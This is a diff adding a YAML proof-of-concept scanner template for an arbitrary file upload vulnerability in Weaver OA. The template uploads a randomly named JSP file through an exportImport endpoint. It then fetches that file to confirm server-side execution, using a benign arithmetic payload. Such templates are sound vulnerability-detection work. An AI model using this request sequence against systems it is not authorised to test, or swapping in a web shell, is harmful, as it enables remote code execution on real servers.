@@ -1,0 +1,24 @@
+name: poc-yaml-weaver-oa-arbitrary-file-upload
+set:
+  r1: randomLowercase(4)
+  r2: randomInt(40000, 44800)
+  r3: randomInt(40000, 44800)
+rules:
+  - method: POST
+    path: /page/exportImport/uploadOperation.jsp
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
+    body: |-
+      ------WebKitFormBoundaryFy3iNVBftjP6IOwo
+      Content-Disposition: form-data; name="file"; filename="{{r1}}.jsp"
+      Content-Type: application/octet-stream
+      <%out.print({{r2}} * {{r3}});%>
+      ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
+    expression: response.status == 200
+  - method: GET
+    path: '/page/exportImport/fileTransfer/{{r1}}.jsp'
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r2 * r3)))
+detail:
+  author: jingling(https://github.com/shmilylty)
+  links:
+    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
